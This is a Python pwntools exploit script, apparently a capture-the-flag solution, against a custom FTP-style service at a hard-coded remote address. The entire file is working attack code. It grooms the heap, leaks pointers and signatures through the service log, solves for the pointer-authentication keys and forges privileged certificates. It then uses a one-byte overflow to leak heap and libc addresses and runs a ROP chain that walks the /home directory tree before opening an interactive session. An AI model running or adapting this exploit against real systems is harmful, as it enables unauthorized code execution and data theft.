from pwn import *
import base64
import re
from hsm_test import crypt
import subprocess
from dataclasses import dataclass

context.update(arch="amd64")

#s = remote('focal', 31500); local = True
s = remote('62.210.131.87', 31337); local = False

banner = s.recvline()
log.info("* %s", banner.rstrip(b"\n").decode())

def send_cmd(cmd, msg="", reply=True):
    if isinstance(cmd, str):
        cmd = cmd.encode()
    if isinstance(msg, str):
        msg = msg.encode()
    s.sendline(cmd + b" " + msg)
    if reply:
        resp = s.recvline().rstrip(b"\n").decode()
        log.info("%s => %s", cmd.decode(), resp)
        return resp

def pasv_cmd(cmd, msg=""):
    resp = send_cmd("PASV")
    addr = resp.split("(")[1].split(")")[0].split(",")
    host = ".".join(addr[:4])
    port = int(addr[4]) * 256 + int(addr[5])
    conn2 = remote(host, port)

    if isinstance(cmd, str):
        cmd = cmd.encode()
    resp = send_cmd(cmd, msg)
    if resp == "150 Ok":
        data = conn2.recvall()
    resp = s.recvline().rstrip(b"\n").decode()
    log.info("%s => %s", cmd.decode(), resp)

    return data

PAC_MASK = 0xffff0000_00000000

# Groom heap
user = "&user=" + "A" * 0x30
# payload = f"perms=0{user*4}&sig=0" # with malloc_preload
payload = f"perms=0{user*1}&sig=0"
payload = payload.encode()
# payload = payload.ljust(762, b"X") # maximum length

send_cmd("CERT", base64.b64encode(payload))

# Leak data from User struct
send_cmd("USER", "anon")
send_cmd("PASS", "xxxx")
send_cmd("DBG")
send_cmd("USER", "AAAABBBBCCCCDDDD")
send_cmd("DBG") # fails, need login

send_cmd("USER", "anonymous")
send_cmd("PASS", "xxxx")
send_cmd("USER", "EEEEFFFFGGGGHHHH")
send_cmd("DBG") # fails, need login
send_cmd("USER", "anonymous")

logf = pasv_cmd("RETR", "ftp.log")
leak1 = re.findall(b"(?s)User AAAABBBBCCCCDDDD(.+?) : Command", logf)[0]
leak2 = re.findall(b"(?s)User EEEEFFFFGGGGHHHH(.+?) : Command", logf)[0]
log.info("Leak 1: %s", leak1.hex())
log.info("Leak 2: %s", leak2.hex())

# Solve for keys
msg1 = u64(b"\x01anon\x00\x00\x00")
sig1 = u64(leak1[:8])
msg2 = u64(b"\x01anonymo")
sig2 = u64(leak2[:8])
ptrleak = u64(leak1[8:16])
assert ptrleak == u64(leak2[8:16]), "Sanity check fail"
exebase = (ptrleak & ~PAC_MASK) - 0x49c0

log.info("exe base: %#x", exebase)
log.info("Solving for keys with %#x=>%#x, %#x=>%#x", msg1, sig1, msg2, sig2)

if local:
    keypairs = [(123, 456)]
else:
    res = subprocess.check_output(["sage", "hsm_solve.sage", str(msg1), str(sig1), str(msg2), str(sig2)])
    keypairs = [tuple(map(int, row.split())) for row in res.strip().split(b"\n")]
for k1, k2 in keypairs:
    log.info("Candidate k1=%#x k2=%#x", k1, k2)

def sign(x, key=0):
    if isinstance(x, bytes):
        sig = 0
        for i in range(0, len(x), 8):
            chunk = u64(x[i:i+8].ljust(8, b"\0"))
            sig = crypt(chunk, sig, k1, k2)
        return sig
    return crypt(x, key, k1, k2)

def signptr(x, key=0):
    sig = sign(x, key)
    return x | (sig & PAC_MASK)

log.info("Test PAC: %x => %x (expected %x)",
    ptrleak & ~PAC_MASK, signptr(ptrleak & ~PAC_MASK), ptrleak)

# Get higher perms
for k1, k2 in keypairs:
    payload = b"perms=63&user=" + cyclic(0x60)
    sig = sign(payload)
    payload += b"&sig=%d" % sig
    resp = send_cmd("CERT", base64.b64encode(payload))
    if resp == "150 Ok":
        log.info("Confirmed k1=%#x k2=%#x", k1, k2)
        break
else:
    raise Exception("Failed to forge certificates...")

# secret = pasv_cmd("RETR", "secret.txt")
# log.info("Secret: %s", secret.decode())

# Overflow input buffer by one to switch to User auth
send_cmd(b"TYPE", b"X" * (1024 - 6))
payload = b"perms=63&user=" + cyclic(0x30)
sig = sign(payload)
payload += b"&sig=%d" % sig
resp = send_cmd("CERT", base64.b64encode(payload))
logf = pasv_cmd("RETR", "ftp.log")

heapleak = re.findall(b"Command CERT .+\nUser (......) : Command TYPE", logf)[-1]
heapleak = u64(heapleak.ljust(8, b"\0"))
heapbase = heapleak - 0x8010
log.info("heap base: %#x", heapbase)
inputaddr = heapbase + 0x5680
certaddr = heapbase + 0x5890

def setcert(authed=1, perms=0xff, username=certaddr):
    computeSig = signptr(exebase + 0x49c0) # use computeSigUser so we don't have to know what's at that address
    destructor = signptr(exebase + 0x56a0) # no-op to avoid freeing the object
    sig = sign(bytes([perms]) + p64(username)[:7])
    payload = b"X" * 0x208 + p64(0x41) + struct.pack("<QQQQQQ", authed, perms, username, sig, computeSig, destructor)
    send_cmd("CERT", base64.b64encode(payload))

# leak libc
setcert(username=exebase + 0x8e20) # getenv@got
logf = pasv_cmd("RETR", "ftp.log")
libcleak = re.findall(b"Command CERT .+\nUser (......) : Command PASV", logf)[-1]
libcleak = u64(libcleak.ljust(8, b"\0"))
libcbase = libcleak - 0x45ed0
log.info("libc base: %#x", libcbase)

pop_rdi = libcbase + 0x0007a307
pop_rsi = libcbase + 0x0007a0ff
pop_rdx_rcx_rbx = libcbase + 0x001025ad
mov_rdx_rax = libcbase + 0x000425cf
pop_rsp = libcbase + 0x00054d0d
ropspace = heapbase + 0x10000
dataspace = heapbase + 0x18000
inc_rax = libcbase + 0x000cfb20

# fds: 0=stdin, 1=stdout, 2=stderr, 3=serial_port, 4=server_sock, 5=client_sock, 6=dbg
roploop = [
    # read(5, ropspace, 0x8000)
    pop_rdi, 5,
    pop_rsi, ropspace,
    pop_rdx_rcx_rbx, 0x8000, 0, 0,
    exebase + 0x21c0,
    # pop rsp
    pop_rsp, ropspace
]
payload = flat(roploop) + b"perms=63&user=x"
sig = sign(payload)
payload = payload.replace(b"\0", b"\n") + b"&sig=%d&" % sig
payload = payload.ljust(0x208, b"X")
assert len(payload) == 0x208
payload = payload + p64(0x41) + struct.pack("<QQQQQQ", 1, 0xff, certaddr, 0, signptr(pop_rdi), 0)
send_cmd("CERT", base64.b64encode(payload), reply=False)

@dataclass
class DirEntry:
    inode: int
    offset: int
    ftype: int
    name: str

def getdents(dirname):
    ropdata = b""
    offset = 0x200
    def add_data(x):
        nonlocal ropdata
        addr = ropspace + offset + len(ropdata)
        ropdata += x
        return addr

    rop = [
        # open(dirname, O_DIRECTORY)
        pop_rdi, add_data(dirname.encode() + b"\0"),
        pop_rsi, 0o0200000,
        exebase + 0x22d0,
        # rax = getdents64(7, dataspace, 0x8000)
        pop_rdi, 7,
        pop_rsi, dataspace,
        pop_rdx_rcx_rbx, 0x8000, 0, 0,
        libcbase + 0xde2d0,
        # write(5, dataspace, rax+1)
        inc_rax,
        mov_rdx_rax,
        pop_rdi, 5,
        pop_rsi, dataspace,
        exebase + 0x20c0,
        # write(5, "__END_DATA__", 12)
        pop_rdi, 5,
        pop_rsi, add_data(b"__END_DATA__"),
        pop_rdx_rcx_rbx, 12, 0, 0,
        exebase + 0x20c0,
        # close(7)
        pop_rdi, 7,
        exebase + 0x2190,
    ] + roploop
    rop = flat(rop).ljust(offset, b"\0")
    assert len(rop) == offset
    rop += ropdata
    s.send(rop)

    res = s.recvuntil(b"__END_DATA__", drop=True)
    recs = []
    ptr = 0
    while ptr < len(res) - 1:
        d_ino, d_off, d_reclen, d_type = struct.unpack_from("<QqHB", res, ptr)
        d_name = res[ptr+19:ptr+d_reclen].split(b"\0")[0].decode("latin1")
        recs.append(DirEntry(d_ino, d_off, d_type, d_name))
        ptr += d_reclen
    return recs

def dump_rec(dir, indent=0):
    recs = getdents(dir)
    for rec in recs:
        print(f"{'  '*indent}{rec.name} type={rec.ftype} inode={rec.inode}")
        if rec.ftype == 4 and rec.name not in (".", ".."):
            dump_rec(f"{dir}/{rec.name}", indent + 1)

dump_rec("/home")

s.interactive()
